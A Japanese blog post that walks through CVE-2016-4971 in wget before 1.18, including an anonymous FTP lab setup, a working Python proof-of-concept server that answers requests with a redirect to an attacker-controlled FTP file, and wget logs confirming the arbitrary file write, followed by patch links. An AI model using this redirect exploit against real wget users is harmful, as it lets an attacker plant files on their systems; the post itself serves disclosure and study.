---
layout: post
title:  "CVE-2016-4971 Wgetによる任意のファイルの書き込み"
date:   2016-07-06 10:30:00 +0900
categories: Vulnerability
---

## 概要

wget 1.18未満のVersionにはHTTPリダイレクトを用いてFTPリソースから任意のファイル名でファイルを作成される脆弱性があります。

## 攻撃の詳細

以下のようにwgetを用いて攻撃者の管理下にあるファイルを取りにいくと

```
wget http://attacker.test/hoge.txt
```

攻撃者は以下のような30X系のレスポンスを返すことで任意のファイルを被害者のサーバに作成することができる。

```
HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=UTF-8
Location: ftp://attacker.test/foo.txt
Content-Length: 262
Server: Apache
```

## 検証環境の構築

```
kosuke@scapegoat ~ $ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.5 (jessie)
Release:        8.5
Codename:       jessie
```

 * 攻撃用サーバにftpサーバを構築する

```
kosuke@attacker ~ $ sudo apt-get install ftp proftpd
```

 * ftpサーバにanonymous loginの設定を行う

```
<Anonymous /tmp/ftp>
  User                          ftp
  Group                         nogroup
  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp
  # Cosmetic changes, all files belongs to ftp user
  DirFakeUser   on ftp
  DirFakeGroup on ftp

  RequireValidShell             off

  # Limit the maximum number of anonymous logins
  MaxClients                    10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin                  welcome.msg
  DisplayChdir          .message

  # Limit WRITE everywhere in the anonymous chroot
  <Directory *>
    <Limit WRITE>
      DenyAll
    </Limit>
  </Directory>

</Anonymous>
```

 * anonymous loginできるかを検証する

```
kosuke@scapegoat ~ $ ftp attacker.test
Connected to attacker.test.
220 ProFTPD 1.3.5 Server (Debian) [::ffff:192.168.10.103]
Name (attacker.test:kosuke): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
```

## 実証

 * 攻撃用のスクリプトを作成

```
#!/usr/bin/python
import http.server
import socketserver

HTTP_PORT = 8000
FTP_HOST = 'attacker.test'
FTP_PORT = 21
FILENAME = 'HACKING.txt'

class wgetExploit(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        self.send_response(301)
        ftp_path = '%s'%('ftp://anonymous@%s:%s/%s'%(FTP_HOST, FTP_PORT, FILENAME))
        self.send_header('Location', ftp_path)
        self.end_headers()

httpd = socketserver.TCPServer(("", HTTP_PORT), wgetExploit)
httpd.serve_forever()
```

 * 攻撃用スクリプトを用いてHTTPサーバを起動する

```
kosuke@attacker ~ $ python --version
Python 3.5.1
kosuke@attacker ~ $ python exploit.py
```

 * scapegoat.testでwgetを実行しHACKING.txtが作成されることを確認する

```
kosuke@attacker ~ $ wget http://attacker.test:8000
--2016-07-06 16:39:36--  http://attacker.test:8000/
attacker.test (attacker.test) をDNSに問いあわせています... 127.0.0.1
attacker.test (attacker.test)|127.0.0.1|:8000 に接続しています... 接続しました。
HTTP による接続要求を送信しました、応答を待っています... 301 Moved Permanently
場所: ftp://anonymous@attacker.test:21/HACKING.txt [続く]
--2016-07-06 16:39:36--  ftp://anonymous@attacker.test/HACKING.txt
           => `HACKING.txt'
attacker.test (attacker.test)|127.0.0.1|:21 に接続しています... 接続しました。
anonymous としてログインしています... ログインしました!
==> SYST ... 完了しました。    ==> PWD ... 完了しました。
==> TYPE I ... 完了しました。  ==> CWD は必要ありません。
==> SIZE HACKING.txt ... 8
==> PASV ... 完了しました。    ==> RETR HACKING.txt ... 完了しました。
長さ: 8 (確証はありません)

HACKING.txt             100%[=================================>]       8  --.-KB/s 時間 0s

2016-07-06 16:39:36 (53.6 KB/s) - `HACKING.txt' へ保存終了 [8]

kosuke@attacker ~ $ cat HACKING.txt
HACKING
```

 * サーバレスポンスを確認する

```
kosuke@attacker ~ $ wget http://attacker.test:8000 --server-response
--2016-07-06 16:40:45--  http://attacker.test:8000/
attacker.test (attacker.test) をDNSに問いあわせています... 127.0.0.1
attacker.test (attacker.test)|127.0.0.1|:8000 に接続しています... 接続しました。
HTTP による接続要求を送信しました、応答を待っています...
  HTTP/1.0 301 Moved Permanently
  Server: SimpleHTTP/0.6 Python/3.5.1
  Date: Wed, 06 Jul 2016 07:40:45 GMT
  Location: ftp://anonymous@attacker.test:21/HACKING.txt
場所: ftp://anonymous@attacker.test:21/HACKING.txt [続く]
--2016-07-06 16:40:45--  ftp://anonymous@attacker.test/HACKING.txt
           => `HACKING.txt.1'
attacker.test (attacker.test)|127.0.0.1|:21 に接続しています... 接続しました。
anonymous としてログインしています...
220 ProFTPD 1.3.5 Server (Debian) [::ffff:127.0.0.1]
--> USER anonymous

331 Anonymous login ok, send your complete email address as your password
--> PASS Turtle Power!

230 Anonymous access granted, restrictions apply
--> SYST

215 UNIX Type: L8
--> PWD

257 "/" is the current directory
--> TYPE I

200 Type set to I
==> CWD は必要ありません。
--> SIZE HACKING.txt

213 8
--> PASV

227 Entering Passive Mode (127,0,0,1,229,203).
--> RETR HACKING.txt

150 Opening BINARY mode data connection for HACKING.txt (8 bytes)
長さ: 8 (確証はありません)

HACKING.txt.1           100%[=================================>]       8  --.-KB/s 時間 0s

226 Transfer complete
2016-07-06 16:40:45 (30.7 KB/s) - `HACKING.txt.1' へ保存終了 [8]
```

## パッチ情報

 * https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-4971
 * https://security-tracker.debian.org/tracker/CVE-2016-4971

## 参考文献

 * https://blogs.securiteam.com/index.php/archives/2701
 * https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-4971
 * http://docs.python.jp/3/library/http.server.html


